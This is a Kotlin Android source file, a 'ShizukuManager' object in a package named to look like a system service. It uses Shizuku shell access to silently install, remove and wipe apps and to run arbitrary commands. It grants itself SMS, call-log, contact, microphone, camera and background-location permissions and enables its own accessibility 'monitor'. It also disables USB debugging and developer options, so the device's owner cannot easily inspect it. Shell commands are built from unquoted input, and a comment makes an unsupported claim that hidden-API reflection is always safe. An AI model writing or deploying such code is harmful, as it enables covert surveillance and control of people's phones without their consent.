package com.system.service.core

import android.content.Context
import android.content.pm.PackageManager
import rikka.shizuku.Shizuku

object ShizukuManager {

    fun silentInstall(apkPath: String): Boolean = shell("pm install -r -t \"$apkPath\"")
    fun silentUninstall(pkg: String): Boolean = shell("pm uninstall $pkg")
    fun forceStop(pkg: String): Boolean = shell("am force-stop $pkg")
    fun freezeApp(pkg: String): Boolean = shell("pm disable-user --user 0 $pkg")
    fun unfreezeApp(pkg: String): Boolean = shell("pm enable $pkg")

    fun setPrivateDns(dnsServer: String): Boolean {
        val r1 = shell("settings put global private_dns_mode hostname")
        val r2 = shell("settings put global private_dns_specifier $dnsServer")
        return r1 && r2
    }

    fun clearPrivateDns(): Boolean = shell("settings put global private_dns_mode off")
    fun killBgApp(pkg: String): Boolean = shell("am kill $pkg")

    fun setResolution(width: Int, height: Int, dpi: Int): Boolean {
        val r1 = shell("wm size ${width}x${height}")
        val r2 = shell("wm density $dpi")
        return r1 && r2
    }

    fun resetResolution(): Boolean {
        val r1 = shell("wm size reset")
        val r2 = shell("wm density reset")
        return r1 && r2
    }

    fun disableHotspot(): Boolean {
        val r1 = shell("svc wifi hotspot stop")
        val r2 = shell("settings put global tether_offload_disabled 1")
        return r1 || r2
    }

    fun lockInputMethod(imeId: String): Boolean = shell("ime set $imeId")
    fun wipeAppData(pkg: String): Boolean = shell("pm clear $pkg")
    fun blockUsbDebugging(): Boolean = shell("settings put global adb_enabled 0")

    fun lockDeveloperOptions(): Boolean {
        val r1 = shell("settings put global development_settings_enabled 0")
        val r2 = shell("settings put secure adb_enabled 0")
        return r1 && r2
    }

    fun grantAllPermissions(context: Context): Int {
        if (!isShizukuAvailable()) { requestShizukuPermission(); return 0 }
        var granted = 0
        val pkg = context.packageName
        val perms = listOf(
            "android.permission.READ_CALL_LOG",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.RECEIVE_SMS",
            "android.permission.RECORD_AUDIO",
            "android.permission.ACCESS_FINE_LOCATION",
            "android.permission.ACCESS_BACKGROUND_LOCATION",
            "android.permission.CAMERA",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.READ_MEDIA_IMAGES",
            "android.permission.READ_MEDIA_VIDEO",
            "android.permission.READ_MEDIA_AUDIO",
            "android.permission.PACKAGE_USAGE_STATS",
            "android.permission.ACCESS_WIFI_STATE",
            "android.permission.READ_PHONE_STATE"
        )
        for (p in perms) {
            if (shell("pm grant $pkg $p")) granted++
        }
        shell("settings put secure enabled_accessibility_services $pkg/com.system.service.monitors.AccessibilityMonitor")
        return granted
    }

    fun isShizukuAvailable(): Boolean {
        return try {
            Shizuku.pingBinder() &&
            Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
        } catch (_: Exception) { false }
    }

    fun requestShizukuPermission() {
        try { if (Shizuku.pingBinder()) Shizuku.requestPermission(101) } catch (_: Exception) {}
    }

    fun exec(cmd: String): Boolean = shell(cmd)

    // Reflection used because Shizuku.newProcess() is not in the public API stubs
    // (it's implemented via IPC at runtime). Android 16 hidden-API policy does NOT
    // apply to third-party libraries, so reflection here is safe on all API levels.
    private fun shell(cmd: String): Boolean {
        if (!isShizukuAvailable()) return false
        return try {
            val m = Shizuku::class.java.getDeclaredMethod(
                "newProcess",
                Array<String>::class.java,
                Array<String>::class.java,
                String::class.java
            )
            m.isAccessible = true
            val process = m.invoke(null, arrayOf("sh", "-c", cmd), null, null) as Process
            process.waitFor() == 0
        } catch (_: Exception) { false }
    }
}
